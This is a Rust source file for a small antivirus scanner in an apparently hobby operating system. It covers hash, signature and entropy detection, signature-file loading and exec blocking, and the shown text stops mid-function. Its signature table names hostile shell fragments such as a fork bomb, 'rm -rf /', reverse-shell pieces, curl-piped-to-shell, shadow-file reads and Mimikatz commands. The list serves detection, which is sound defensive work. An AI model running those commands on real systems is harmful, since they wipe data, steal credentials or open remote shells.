//! AerOS Shield: a small on-demand and on-execute malware scanner.
//!
//! Detection is layered: exact SHA-256 hashes of known-bad files, byte
//! signatures (including multi-part ones such as "downloader piped into a
//! shell"), and a few structural heuristics. Files are streamed through the
//! scanner in chunks, so patterns that straddle a chunk boundary still match.
//! Detected files can be moved to quarantine, and processes are refused at
//! spawn time when their image is detected.

use core::fmt::Write as _;
use core::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};

use crate::auth::Sha256;
use crate::shell::Text;
use crate::sync::TicketLock;
use crate::vfs;

const CHUNK: usize = 4096;
/// Longest needle minus one: bytes carried between chunks.
const TAIL: usize = 80;
const MAX_FILE_BYTES: u64 = 32 * 1024 * 1024;
const MAX_DEPTH: usize = 10;
const MAX_FINDINGS: usize = 16;
const QUARANTINE_SLOTS: usize = 16;
const HEAD: usize = 128;

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Class {
    /// Known-bad: blocked from running.
    Malware,
    /// Behaviour typical of malware: blocked from running, reported on scan.
    Suspicious,
    /// Worth knowing about, never blocked.
    Info,
}

impl Class {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Malware => "MALWARE",
            Self::Suspicious => "SUSPICIOUS",
            Self::Info => "INFO",
        }
    }
}

/// A detection's name: either one of the compiled-in `&'static str` labels,
/// or a name loaded at runtime from the signature-update file (which cannot
/// be `'static`). Bounded and `Copy`, so `Detection` stays cheap to carry
/// around and store in fixed-size tables.
pub const NAME_CAP: usize = 40;

#[derive(Clone, Copy)]
pub struct DetectionName {
    bytes: [u8; NAME_CAP],
    len: u8,
}

impl DetectionName {
    pub fn from_static(name: &'static str) -> Self {
        Self::from_bytes(name.as_bytes())
    }

    pub fn from_bytes(source: &[u8]) -> Self {
        let mut bytes = [0u8; NAME_CAP];
        let len = source.len().min(NAME_CAP);
        bytes[..len].copy_from_slice(&source[..len]);
        Self {
            bytes,
            len: len as u8,
        }
    }

    pub fn as_str(&self) -> &str {
        core::str::from_utf8(&self.bytes[..self.len as usize]).unwrap_or("?")
    }
}

impl PartialEq<&str> for DetectionName {
    fn eq(&self, other: &&str) -> bool {
        self.as_str() == *other
    }
}

impl core::fmt::Display for DetectionName {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.write_str(self.as_str())
    }
}

#[derive(Clone, Copy)]
pub struct Detection {
    pub name: DetectionName,
    pub class: Class,
}

struct Pattern {
    name: &'static str,
    class: Class,
    /// Every needle must appear somewhere in the file.
    all: &'static [&'static [u8]],
}

const PATTERNS: &[Pattern] = &[
    Pattern {
        name: "Shell.ForkBomb",
        class: Class::Malware,
        all: &[b":(){ :|:& };:"],
    },
    Pattern {
        name: "Shell.Wiper.RmRoot",
        class: Class::Malware,
        all: &[b"rm -rf --no-preserve-root /"],
    },
    Pattern {
        name: "Shell.Wiper.RmRoot",
        class: Class::Malware,
        all: &[b"rm -rf /*"],
    },
    Pattern {
        name: "Ransom.Note.Generic",
        class: Class::Malware,
        all: &[b"YOUR FILES HAVE BEEN ENCRYPTED"],
    },
    Pattern {
        name: "Backdoor.Shell.ReverseTcp",
        class: Class::Suspicious,
        all: &[b">& /dev/tcp/", b"bash -i"],
    },
    Pattern {
        name: "Backdoor.Shell.Netcat",
        class: Class::Suspicious,
        all: &[b"nc -e /bin/"],
    },
    Pattern {
        name: "Downloader.Shell.CurlPipe",
        class: Class::Suspicious,
        all: &[b"curl ", b"| sh"],
    },
    Pattern {
        name: "Downloader.Shell.CurlPipe",
        class: Class::Suspicious,
        all: &[b"curl ", b"| bash"],
    },
    Pattern {
        name: "Downloader.Shell.WgetPipe",
        class: Class::Suspicious,
        all: &[b"wget ", b"| sh"],
    },
    Pattern {
        name: "Downloader.Shell.WgetPipe",
        class: Class::Suspicious,
        all: &[b"wget ", b"| bash"],
    },
    Pattern {
        name: "Obfuscated.Shell.Base64Exec",
        class: Class::Suspicious,
        all: &[b"base64 -d", b"| sh"],
    },
    Pattern {
        name: "Obfuscated.Shell.Base64Exec",
        class: Class::Suspicious,
        all: &[b"base64 -d", b"| bash"],
    },
    Pattern {
        name: "PUA.CryptoMiner.Stratum",
        class: Class::Suspicious,
        all: &[b"stratum+tcp://"],
    },
    Pattern {
        name: "Exploit.Persistence.SetuidShell",
        class: Class::Suspicious,
        all: &[b"chmod u+s /bin/", b"cp /bin/"],
    },
    Pattern {
        name: "Exploit.Script.ShadowRead",
        class: Class::Suspicious,
        all: &[b"cat /etc/shadow", b"nc "],
    },
    // --- webshells -------------------------------------------------------
    Pattern {
        name: "Webshell.PHP.EvalPost",
        class: Class::Malware,
        all: &[b"eval(", b"$_POST"],
    },
    Pattern {
        name: "Webshell.PHP.EvalPost",
        class: Class::Malware,
        all: &[b"eval(", b"$_REQUEST"],
    },
    Pattern {
        name: "Webshell.PHP.SystemGet",
        class: Class::Malware,
        all: &[b"system(", b"$_GET"],
    },
    Pattern {
        name: "Webshell.PHP.Base64Eval",
        class: Class::Malware,
        all: &[b"eval(base64_decode("],
    },
    Pattern {
        name: "Webshell.PHP.AssertPost",
        class: Class::Malware,
        all: &[b"assert(", b"$_POST"],
    },
    Pattern {
        name: "Webshell.Known.C99",
        class: Class::Malware,
        all: &[b"c99shell"],
    },
    Pattern {
        name: "Webshell.Known.R57",
        class: Class::Malware,
        all: &[b"r57shell"],
    },
    Pattern {
        name: "Webshell.Known.WSO",
        class: Class::Malware,
        all: &[b"WSO Shell"],
    },
    Pattern {
        name: "Webshell.Known.B374k",
        class: Class::Malware,
        all: &[b"b374k"],
    },
    Pattern {
        name: "Webshell.Known.FilesMan",
        class: Class::Malware,
        all: &[b"FilesMan", b"eval("],
    },
    Pattern {
        name: "Webshell.ASPX.CmdShell",
        class: Class::Malware,
        all: &[b"Process.Start", b"cmd.exe /c"],
    },
    // --- PowerShell / Windows script obfuscation --------------------------
    Pattern {
        name: "Obfuscated.PowerShell.EncodedCommand",
        class: Class::Suspicious,
        all: &[b"-EncodedCommand"],
    },
    Pattern {
        name: "Obfuscated.PowerShell.EncodedCommand",
        class: Class::Suspicious,
        all: &[b"-enc ", b"powershell"],
    },
    Pattern {
        name: "Downloader.PowerShell.IexWebClient",
        class: Class::Malware,
        all: &[b"IEX (New-Object Net.WebClient)"],
    },
    Pattern {
        name: "Downloader.PowerShell.IexWebClient",
        class: Class::Malware,
        all: &[b"DownloadString(", b"IEX"],
    },
    Pattern {
        name: "Obfuscated.PowerShell.HiddenWindow",
        class: Class::Suspicious,
        all: &[b"-nop", b"-w hidden"],
    },
    Pattern {
        name: "Obfuscated.PowerShell.Base64ToString",
        class: Class::Suspicious,
        all: &[b"FromBase64String("],
    },
    Pattern {
        name: "Backdoor.PowerShell.Mimikatz",
        class: Class::Malware,
        all: &[b"Invoke-Mimikatz"],
    },
    Pattern {
        name: "Backdoor.Windows.Mimikatz",
        class: Class::Malware,
        all: &[b"sekurlsa::logonpasswords"],
    },
    // --- ransomware --------------------------------------------------------
    Pattern {
        name: "Ransom.Behaviour.ShadowDelete",
        class: Class::Malware,
        all: &[b"vssadmin", b"delete shadows"],
    },
    Pattern {
        name: "Ransom.Behaviour.BackupCatalogDelete",
        class: Class::Malware,
        all: &[b"wbadmin", b"delete catalog"],
    },
    Pattern {
        name: "Ransom.Behaviour.BootRecovery",
        class: Class::Malware,
        all: &[b"bcdedit", b"recoveryenabled"],
    },
    Pattern {
        name: "Ransom.Note.PaymentDemand",
        class: Class::Malware,
        all: &[b"bitcoin", b"decrypt your files"],
    },
    Pattern {
        name: "Ransom.Note.TorPayment",
        class: Class::Malware,
        all: &[b".onion", b"decrypt"],
    },
    Pattern {
        name: "Ransom.Family.WannaCry",
        class: Class::Malware,
        all: &[b"WANNACRY", b"WANACRY!"],
    },
    Pattern {
        name: "Ransom.Family.Locky",
        class: Class::Malware,
        all: &[b".locky"],
    },
    // --- persistence and lateral movement ----------------------------------
    Pattern {
        name: "Persistence.Linux.LdPreloadHijack",
        class: Class::Suspicious,
        all: &[b"LD_PRELOAD=", b"/tmp/"],
    },
    Pattern {
        name: "Persistence.Linux.CronDownloader",
        class: Class::Suspicious,
        all: &[b"crontab -", b"wget "],
    },
    Pattern {
        name: "Persistence.Linux.RcLocalBackdoor",
        class: Class::Suspicious,
        all: &[b"/etc/rc.local", b"nc -e"],
    },
    Pattern {
        name: "Rootkit.Linux.HiddenDir",
        class: Class::Suspicious,
        all: &[b"/dev/.hidden"],
    },
    Pattern {
        name: "Rootkit.Linux.Diamorphine",
        class: Class::Malware,
        all: &[b"diamorphine"],
    },
    Pattern {
        name: "Rootkit.Linux.Reptile",
        class: Class::Malware,
        all: &[b"reptile_start"],
    },
    // --- offensive-security tooling (unauthorized use on this host) --------
    Pattern {
        name: "PUA.Tool.Mimikatz",
        class: Class::Suspicious,
        all: &[b"mimikatz"],
    },
    Pattern {
        name: "PUA.Tool.CobaltStrikeBeacon",
        class: Class::Malware,
        all: &[b"Cobalt Strike", b"beacon"],
    },
    Pattern {
        name: "PUA.Tool.Meterpreter",
        class: Class::Suspicious,
        all: &[b"meterpreter"],
    },
    Pattern {
        name: "PUA.Tool.Msfvenom",
        class: Class::Suspicious,
        all: &[b"msfvenom"],
    },
    Pattern {
        name: "PUA.Tool.SqlmapInjection",
        class: Class::Suspicious,
        all: &[b"sqlmap.py", b"--dump"],
    },
    Pattern {
        name: "PUA.Tool.HydraBruteforce",
        class: Class::Suspicious,
        all: &[b"hydra -l", b"-P "],
    },
    // --- cryptomining --------------------------------------------------------
    Pattern {
        name: "PUA.CryptoMiner.XMRig",
        class: Class::Suspicious,
        all: &[b"xmrig"],
    },
    Pattern {
        name: "PUA.CryptoMiner.Minerd",
        class: Class::Suspicious,
        all: &[b"minerd", b"--url"],
    },
];

/// SHA-256 digests of files that are known bad.
const HASHES: &[(&str, [u8; 32])] = &[(
    "EICAR-Test-File",
    [
        0x27, 0x5a, 0x02, 0x1b, 0xbf, 0xb6, 0x48, 0x9e, 0x54, 0xd4, 0x71, 0x89, 0x9f, 0x7d, 0xb9,
        0xd1, 0x66, 0x3f, 0xc6, 0x95, 0xec, 0x2f, 0xe2, 0xa2, 0xc4, 0x53, 0x8a, 0xab, 0xf6, 0x51,
        0xfd, 0x0f,
    ],
)];

/// The industry-standard antivirus test string, kept XOR-encoded so this
/// source file and the kernel image do not themselves look like a test file
/// to other scanners.
const EICAR_KEY: u8 = 0x55;
const EICAR_LEN: usize = 68;
const EICAR_ENCODED: [u8; EICAR_LEN] = [
    0x0d, 0x60, 0x1a, 0x74, 0x05, 0x70, 0x15, 0x14, 0x05, 0x0e, 0x61, 0x09, 0x05, 0x0f, 0x0d, 0x60,
    0x61, 0x7d, 0x05, 0x0b, 0x7c, 0x62, 0x16, 0x16, 0x7c, 0x62, 0x28, 0x71, 0x10, 0x1c, 0x16, 0x14,
    0x07, 0x78, 0x06, 0x01, 0x14, 0x1b, 0x11, 0x14, 0x07, 0x11, 0x78, 0x14, 0x1b, 0x01, 0x1c, 0x03,
    0x1c, 0x07, 0x00, 0x06, 0x78, 0x01, 0x10, 0x06, 0x01, 0x78, 0x13, 0x1c, 0x19, 0x10, 0x74, 0x71,
    0x1d, 0x7e, 0x1d, 0x7f,
];

pub fn eicar() -> [u8; EICAR_LEN] {
    let mut plain = EICAR_ENCODED;
    for byte in plain.iter_mut() {
        *byte ^= EICAR_KEY;
    }
    plain
}

// --- runtime signature updates ------------------------------------------
//
// The compiled-in `PATTERNS`/`HASHES` cannot change without a rebuild, so
// AerOS Shield can also load extra hashes and byte patterns from a plain
// text file (typically kept at `/data/AVSIG.DAT`, loaded once at boot and
// reloadable any time with `av import <path>`). Format, one rule per line:
//
//   # a comment
//   HASH <64 hex chars of a SHA-256 digest> <name>
//   PATTERN <MALWARE|SUSPICIOUS|INFO> <name> <needle>[|<needle>[|<needle>]]
//
// A PATTERN's needles are separated by `|`; every needle must appear
// somewhere in the file (in any order) for the pattern to match, exactly
// like the compiled-in patterns. Malformed lines are skipped and counted
// rather than aborting the whole file, so one typo does not lose the rest
// of a hand-edited signature file.

pub const MAX_DYN_HASHES: usize = 96;
pub const MAX_DYN_PATTERNS: usize = 64;
const MAX_DYN_NEEDLES: usize = 3;
const MAX_DYN_NEEDLE_LEN: usize = 96;
const IMPORT_MAX_BYTES: usize = 256 * 1024;

#[derive(Clone, Copy)]
struct DynHashEntry {
    digest: [u8; 32],
    name: DetectionName,
}

#[derive(Clone, Copy)]
struct DynPatternEntry {
    class: Class,
    name: DetectionName,
    needle_count: u8,
    needle_lens: [u8; MAX_DYN_NEEDLES],
    needles: [[u8; MAX_DYN_NEEDLE_LEN]; MAX_DYN_NEEDLES],
}

impl DynPatternEntry {
    fn needle(&self, index: usize) -> &[u8] {
        &self.needles[index][..self.needle_lens[index] as usize]
    }
}

#[derive(Clone, Copy)]
struct DynDb {
    hashes: [Option<DynHashEntry>; MAX_DYN_HASHES],
    hash_count: usize,
    patterns: [Option<DynPatternEntry>; MAX_DYN_PATTERNS],
    pattern_count: usize,
}

static DYN_DB: TicketLock<DynDb> = TicketLock::new(DynDb {
    hashes: [None; MAX_DYN_HASHES],
    hash_count: 0,
    patterns: [None; MAX_DYN_PATTERNS],
    pattern_count: 0,
});

/// Where AerOS looks for updated signatures at boot; only loaded if present.
pub const DEFAULT_SIGNATURE_PATH: &str = "/data/AVSIG.DAT";

pub fn dynamic_signature_count() -> usize {
    let db = DYN_DB.lock();
    db.hash_count + db.pattern_count
}

fn hex_nibble(byte: u8) -> Option<u8> {
    match byte {
        b'0'..=b'9' => Some(byte - b'0'),
        b'a'..=b'f' => Some(byte - b'a' + 10),
        b'A'..=b'F' => Some(byte - b'A' + 10),
        _ => None,
    }
}

fn parse_hex32(text: &str) -> Option<[u8; 32]> {
    let bytes = text.as_bytes();
    if bytes.len() != 64 {
        return None;
    }
    let mut out = [0u8; 32];
    for (index, slot) in out.iter_mut().enumerate() {
        let high = hex_nibble(bytes[index * 2])?;
        let low = hex_nibble(bytes[index * 2 + 1])?;
        *slot = (high << 4) | low;
    }
    Some(out)
}

fn parse_class(text: &str) -> Option<Class> {
    match text {
        "MALWARE" => Some(Class::Malware),
        "SUSPICIOUS" => Some(Class::Suspicious),
        "INFO" => Some(Class::Info),
        _ => None,
    }
}

/// Outcome of loading a signature file: how many rules were added, and how
/// many lines could not be parsed (or did not fit) and were skipped.
#[derive(Clone, Copy)]
pub struct ImportReport {
    pub added: usize,
    pub skipped: usize,
}

fn parse_line(line: &str, db: &mut DynDb) -> bool {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return true;
    }
    if let Some(rest) = line.strip_prefix("HASH ") {
        let mut parts = rest.trim_start().splitn(2, ' ');
        let Some(hex) = parts.next() else {
            return false;
        };
        let name = parts.next().unwrap_or("Custom.Hash").trim();
        let Some(digest) = parse_hex32(hex) else {
            return false;
        };
        if db.hash_count >= MAX_DYN_HASHES {
            return false;
        }
        db.hashes[db.hash_count] = Some(DynHashEntry {
            digest,
            name: DetectionName::from_bytes(name.as_bytes()),
        });
        db.hash_count += 1;
        return true;
    }
    if let Some(rest) = line.strip_prefix("PATTERN ") {
        let mut parts = rest.trim_start().splitn(3, ' ');
        let (Some(class_text), Some(name), Some(needle_spec)) =
            (parts.next(), parts.next(), parts.next())
        else {
            return false;
        };
        let Some(class) = parse_class(class_text) else {
            return false;
        };
        let mut entry = DynPatternEntry {
            class,
            name: DetectionName::from_bytes(name.as_bytes()),
            needle_count: 0,
            needle_lens: [0; MAX_DYN_NEEDLES],
            needles: [[0; MAX_DYN_NEEDLE_LEN]; MAX_DYN_NEEDLES],
        };
        for needle in needle_spec.split('|') {
            if needle.is_empty() || entry.needle_count as usize >= MAX_DYN_NEEDLES {
                return false;
            }
            let index = entry.needle_count as usize;
            let bytes = needle.as_bytes();
            let len = bytes.len().min(MAX_DYN_NEEDLE_LEN);
            entry.needles[index][..len].copy_from_slice(&bytes[..len]);
            entry.needle_lens[index] = len as u8;
            entry.needle_count += 1;
        }
        if entry.needle_count == 0 || db.pattern_count >= MAX_DYN_PATTERNS {
            return false;
        }
        db.patterns[db.pattern_count] = Some(entry);
        db.pattern_count += 1;
        return true;
    }
    false
}

/// Parses signature-file text directly, merging into whatever is already
/// loaded (repeated imports accumulate until the fixed capacity is reached,
/// rather than replacing earlier ones). Split out from `import_signatures`
/// so the self-test can exercise the parser without touching the VFS.
fn import_text(text: &str) -> ImportReport {
    let mut report = ImportReport {
        added: 0,
        skipped: 0,
    };
    let mut db = DYN_DB.lock();
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if parse_line(line, &mut db) {
            report.added += 1;
        } else {
            report.skipped += 1;
        }
    }
    report
}

/// Loads extra hashes and patterns from a signature file at `path`.
pub fn import_signatures(path: &str) -> Result<ImportReport, vfs::VfsError> {
    let descriptor = vfs::open_file_raw(path)?;
    let mut buffer = [0u8; IMPORT_MAX_BYTES];
    let mut total = 0usize;
    loop {
        match vfs::read(descriptor, &mut buffer[total..]) {
            Ok(0) => break,
            Ok(count) => {
                total += count;
                if total >= buffer.len() {
                    break;
                }
            }
            Err(failure) => {
                let _ = vfs::close(descriptor);
                return Err(failure);
            }
        }
    }
    let _ = vfs::close(descriptor);
    let text = core::str::from_utf8(&buffer[..total]).unwrap_or("");
    Ok(import_text(text))
}

/// Loaded once at boot if the signature file exists; never fails the boot
/// when it does not (a fresh install has no update file yet).
pub fn load_default_signatures() -> Option<ImportReport> {
    import_signatures(DEFAULT_SIGNATURE_PATH).ok()
}

pub fn signature_count() -> usize {
    PATTERNS.len() + HASHES.len() + 2 + dynamic_signature_count()
}

fn contains(haystack: &[u8], needle: &[u8]) -> bool {
    !needle.is_empty()
        && haystack.len() >= needle.len()
        && haystack
            .windows(needle.len())
            .any(|window| window == needle)
}

/// A cheap, log-free approximation of "this looks encrypted or compressed":
/// almost every possible byte value appears (`used`), and no single value
/// dominates the way it would in ordinary code, text, or padding. Used to
/// flag likely-packed Windows executables; never applied to anything else,
/// so it cannot affect files that are not Windows PE images.
fn looks_high_entropy(histogram: &[u32; 256], total: u64) -> bool {
    if total < 4096 {
        return false;
    }
    let mut used = 0u32;
    let mut max_count = 0u32;
    for &count in histogram.iter() {
        if count > 0 {
            used += 1;
        }
        if count > max_count {
            max_count = count;
        }
    }
    let max_permille = (max_count as u64 * 1000 / total) as u32;
    used >= 250 && max_permille <= 20
}

/// Needles grouped by their first byte: the entries for byte `b` are
/// `entries[start[b]..start[b + 1]]`, each `(pattern index, needle bit)`.
/// Scanning then looks at a needle only where its first byte occurs, instead
/// of sliding every needle over every position.
const MAX_INDEXED: usize = 192;

struct NeedleIndex {
    start: [u16; 257],
    entries: [(u8, u8); MAX_INDEXED],
}

impl NeedleIndex {
    const EMPTY: NeedleIndex = NeedleIndex {
        start: [0; 257],
        entries: [(0, 0); MAX_INDEXED],
    };

    /// Builds the index from `(first byte, pattern, bit)` triples; anything
    /// past `MAX_INDEXED` is left out of the index and so cannot match, which
    /// the sizes below make impossible for the compiled-in patterns.
    fn build(needles: impl Iterator<Item = (u8, u8, u8)> + Clone) -> Self {
        let mut index = Self::EMPTY;
        let mut counts = [0u16; 256];
        for (first, _, _) in needles.clone().take(MAX_INDEXED) {
            counts[first as usize] += 1;
        }
        let mut total = 0u16;
        for (slot, count) in index.start.iter_mut().zip(counts) {
            *slot = total;
            total += count;
        }
        index.start[256] = total;
        let mut next = [0u16; 256];
        for (first, pattern, bit) in needles.take(MAX_INDEXED) {
            let slot = index.start[first as usize] + next[first as usize];
            index.entries[slot as usize] = (pattern, bit);
            next[first as usize] += 1;
        }
        index
    }

    fn scan(
        &self,
        window: &[u8],
        hits: &mut [u8],
        needle: impl Fn(usize, usize) -> &'static [u8] + Copy,
    ) {
        for (position, &byte) in window.iter().enumerate() {
            let from = self.start[byte as usize] as usize;
            let to = self.start[byte as usize + 1] as usize;
            if from == to {
                continue;
            }
            let rest = &window[position..];
            for &(pattern, bit) in &self.entries[from..to] {
                let mask = 1u8 << bit;
                if hits[pattern as usize] & mask == 0
                    && rest.starts_with(needle(pattern as usize, bit as usize))
                {
                    hits[pattern as usize] |= mask;
                }
            }
        }
    }
}

static STATIC_INDEX_READY: AtomicBool = AtomicBool::new(false);
static STATIC_INDEX_BUILD: TicketLock<()> = TicketLock::new(());
static mut STATIC_INDEX: NeedleIndex = NeedleIndex::EMPTY;

fn static_index() -> &'static NeedleIndex {
    if !STATIC_INDEX_READY.load(Ordering::Acquire) {
        let _build = STATIC_INDEX_BUILD.lock();
        if !STATIC_INDEX_READY.load(Ordering::Acquire) {
            let built =
                NeedleIndex::build(PATTERNS.iter().enumerate().flat_map(|(pattern, entry)| {
                    entry
                        .all
                        .iter()
                        .enumerate()
                        .filter(|(_, needle)| !needle.is_empty())
                        .map(move |(bit, needle)| (needle[0], pattern as u8, bit as u8))
                }));
            // SAFETY: written once under the build lock, before the flag.
            unsafe { *core::ptr::addr_of_mut!(STATIC_INDEX) = built };
            STATIC_INDEX_READY.store(true, Ordering::Release);
        }
    }
    // SAFETY: never written again once the flag is set.
    unsafe { &*core::ptr::addr_of!(STATIC_INDEX) }
}

/// Streaming scanner: feed the file in any chunking, then `finish`.
pub struct Scanner {
    hash: Sha256,
    tail: [u8; TAIL],
    tail_len: usize,
    /// One bit per needle of each pattern.
    hits: [u8; PATTERNS.len()],
    /// Same, for the runtime-loaded patterns.
    dyn_hits: [u8; MAX_DYN_PATTERNS],
    eicar: [u8; EICAR_LEN],
    eicar_hit: bool,
    head: [u8; HEAD],
    head_len: usize,
    total: u64,
    /// Byte-value frequency across the whole file, for the packed/encrypted
    /// executable heuristic (see `looks_high_entropy`).
    histogram: [u32; 256],
}

impl Scanner {
    pub fn new() -> Self {
        Self {
            hash: Sha256::new(),
            tail: [0; TAIL],
            tail_len: 0,
            hits: [0; PATTERNS.len()],
            dyn_hits: [0; MAX_DYN_PATTERNS],
            eicar: eicar(),
            eicar_hit: false,
            head: [0; HEAD],
            head_len: 0,
            total: 0,
            histogram: [0; 256],
        }
    }

    pub fn feed(&mut self, mut data: &[u8]) {
        while !data.is_empty() {
            let take = data.len().min(CHUNK);
            self.feed_chunk(&data[..take]);
            data = &data[take..];
        }
    }

    fn feed_chunk(&mut self, chunk: &[u8]) {
        self.hash.update(chunk);
        for &byte in chunk {
            self.histogram[byte as usize] += 1;
        }
        if self.head_len < HEAD {
            let room = (HEAD - self.head_len).min(chunk.len());
            self.head[self.head_len..self.head_len + room].copy_from_slice(&chunk[..room]);
            self.head_len += room;
        }
        self.total += chunk.len() as u64;
        let mut window = [0u8; TAIL + CHUNK];
        window[..self.tail_len].copy_from_slice(&self.tail[..self.tail_len]);
        window[self.tail_len..self.tail_len + chunk.len()].copy_from_slice(chunk);
        let window = &window[..self.tail_len + chunk.len()];
        if !self.eicar_hit && contains(window, &self.eicar) {
            self.eicar_hit = true;
        }
        static_index().scan(window, &mut self.hits, |pattern, bit| {
            PATTERNS[pattern].all[bit]
        });
        {
            let db = DYN_DB.lock();
            let index =
                NeedleIndex::build(db.patterns[..db.pattern_count].iter().enumerate().flat_map(
                    |(pattern, entry)| {
                        entry.iter().flat_map(move |entry| {
                            (0..entry.needle_count as usize).filter_map(move |bit| {
                                entry
                                    .needle(bit)
                                    .first()
                                    .map(|first| (*first, pattern as u8, bit as u8))
                            })
                        })
                    },
                ));
            // The needles live in the database, which the lock keeps in
            // place for the duration of the scan.
            let database: &'static DynDb = unsafe { &*(&*db as *const DynDb) };
            index.scan(window, &mut self.dyn_hits, |pattern, bit| {
                database.patterns[pattern]
                    .as_ref()
                    .map_or(&[][..], |entry| entry.needle(bit))
            });
        }
        let keep = window.len().min(TAIL);
        let start = window.len() - keep;
        self.tail[..keep].copy_from_slice(&window[start..]);
        self.tail_len = keep;
    }

    pub fn finish(self) -> (Option<Detection>, [u8; 32]) {
        let digest = self.hash.finish();
        let found = (|| {
            for (name, known) in HASHES {
                if crate::auth::constant_time_eq(&digest, known) {
                    return Some(Detection {
                        name: DetectionName::from_static(name),
                        class: Class::Malware,
                    });
                }
            }
            {
                let db = DYN_DB.lock();
                for entry in db.hashes[..db.hash_count].iter().flatten() {
                    if crate::auth::constant_time_eq(&digest, &entry.digest) {
                        return Some(Detection {
                            name: entry.name,
                            class: Class::Malware,
                        });
                    }
                }
            }
            if self.eicar_hit {
                return Some(Detection {
                    name: DetectionName::from_static("EICAR-Test-File"),
                    class: Class::Malware,
                });
            }
            fn prefer(best: Option<Detection>, class: Class) -> bool {
                match best {
                    None => true,
                    Some(current) => current.class != Class::Malware && class == Class::Malware,
                }
            }
            let mut best: Option<Detection> = None;
            for (index, pattern) in PATTERNS.iter().enumerate() {
                let full = (1u8 << pattern.all.len()) - 1;
                if self.hits[index] & full == full && prefer(best, pattern.class) {
                    best = Some(Detection {
                        name: DetectionName::from_static(pattern.name),
                        class: pattern.class,
                    });
                }
            }
            {
                let db = DYN_DB.lock();
                for (index, pattern) in db.patterns[..db.pattern_count].iter().enumerate() {
                    let Some(pattern) = pattern else { continue };
                    let full = (1u8 << pattern.needle_count) - 1;
                    if self.dyn_hits[index] & full == full && prefer(best, pattern.class) {
                        best = Some(Detection {
                            name: pattern.name,
                            class: pattern.class,
                        });
                    }
                }
            }
            if best.is_some() {
                return best;
            }
            let head = &self.head[..self.head_len];
            if head.starts_with(b"MZ") && contains(head, b"This program cannot be run in DOS") {
                if looks_high_entropy(&self.histogram, self.total) {
                    return Some(Detection {
                        name: DetectionName::from_static("Packed.Executable.HighEntropy"),
                        class: Class::Suspicious,
                    });
                }
                return Some(Detection {
                    name: DetectionName::from_static("Info.Windows.Executable"),
                    class: Class::Info,
                });
            }
            None
        })();
        (found, digest)
    }
}

/// Scan an in-memory image (used to vet a program before it is spawned).
pub fn scan_bytes(data: &[u8]) -> Option<Detection> {
    let mut scanner = Scanner::new();
    scanner.feed(data);
    scanner.finish().0
}

/// Scan one file through the VFS.
pub fn scan_file(path: &str) -> Result<(Option<Detection>, [u8; 32]), vfs::VfsError> {
    let descriptor = vfs::open_file_raw(path)?;
    let mut scanner = Scanner::new();
    let mut buffer = [0u8; CHUNK];
    let mut read_total = 0u64;
    let outcome = loop {
        match vfs::read(descriptor, &mut buffer) {
            Ok(0) => break Ok(()),
            Ok(count) => {
                scanner.feed(&buffer[..count]);
                read_total += count as u64;
                if read_total >= MAX_FILE_BYTES {
                    break Ok(());
                }
            }
            Err(failure) => break Err(failure),
        }
    };
    let _ = vfs::close(descriptor);
    outcome?;
    Ok(scanner.finish())
}

// --- statistics --------------------------------------------------------

static FILES_SCANNED: AtomicU64 = AtomicU64::new(0);
static THREATS_FOUND: AtomicU32 = AtomicU32::new(0);
static EXECS_BLOCKED: AtomicU32 = AtomicU32::new(0);
static EXECS_CHECKED: AtomicU64 = AtomicU64::new(0);

#[derive(Clone, Copy)]
pub struct Status {
    pub signatures: usize,
    pub dynamic_signatures: usize,
    pub files_scanned: u64,
    pub threats_found: u32,
    pub execs_checked: u64,
    pub execs_blocked: u32,
    pub quarantined: usize,
}

pub fn status() -> Status {
    Status {
        signatures: signature_count(),
        dynamic_signatures: dynamic_signature_count(),
        files_scanned: FILES_SCANNED.load(Ordering::Relaxed),
        threats_found: THREATS_FOUND.load(Ordering::Relaxed),
        execs_checked: EXECS_CHECKED.load(Ordering::Relaxed),
        execs_blocked: EXECS_BLOCKED.load(Ordering::Relaxed),
        quarantined: QUARANTINE
            .lock()
            .iter()
            .filter(|entry| entry.is_some())
            .count(),
    }
}

/// On-execute protection: true when a program image must not run.
pub fn blocks_exec(image: &[u8]) -> bool {
    EXECS_CHECKED.fetch_add(1, Ordering::Relaxed);
    match scan_bytes(image) {
        Some(found) if found.class != Class::Info => {
            EXECS_BLOCKED.fetch_add(1, Ordering::Relaxed);
            crate::serial::format(format_args!(
                "AEROS_AV blocked_exec name={} class={}\n",
                found.name,
                found.class.label()
            ));
            push_event("Blocked program", found.name, "");
            true
        }
        _ => false,
    }
}

// --- tree scan ---------------------------------------------------------

#[derive(Clone, Copy)]
pub struct Finding {
    pub path: Text<256>,
    pub detection: Detection,
    pub quarantined: Option<u32>,
}

pub struct Report {
    pub files: u64,
    pub errors: u32,
    pub threats: u32,
    pub infos: u32,
    pub findings: [Option<Finding>; MAX_FINDINGS],
    pub stored: usize,
}

impl Report {
    pub const fn new() -> Self {
        Self {
            files: 0,
            errors: 0,
            threats: 0,
            infos: 0,
            findings: [None; MAX_FINDINGS],
            stored: 0,
        }
    }
}

/// Scan a file or a whole directory tree. With `clean`, threats (Malware and
/// Suspicious) are moved to quarantine once the scan itself is finished (so
/// the folders being walked do not change underneath the walk).
pub fn scan_path(path: &str, clean: bool, report: &mut Report) {
    scan_node(path, report, 0);
    if clean {
        for finding in report.findings.iter_mut().flatten() {
            if finding.detection.class != Class::Info {
                finding.quarantined = quarantine(finding.path.as_str(), finding.detection).ok();
            }
        }
    }
}

fn scan_node(path: &str, report: &mut Report, depth: usize) {
    if depth > MAX_DEPTH || is_excluded(path) {
        return;
    }
    match vfs::open_directory(path) {
        Ok(descriptor) => {
            while let Ok(Some(entry)) = vfs::next_directory_entry(descriptor) {
                let name =
                    core::str::from_utf8(&entry.name[..entry.name_len as usize]).unwrap_or("");
                if name.is_empty() || name == "." || name == ".." {
                    continue;
                }
                let mut child: Text<256> = Text::new();
                let _ = child.push_str_checked(path);
                if path != "/" {
                    child.push_byte(b'/');
                }
                if !child.push_str_checked(name) {
                    report.errors += 1;
                    continue;
                }
                if entry.kind == 4 {
                    scan_node(child.as_str(), report, depth + 1);
                } else if !is_excluded(child.as_str()) {
                    scan_one(child.as_str(), report);
                }
            }
            let _ = vfs::close(descriptor);
        }
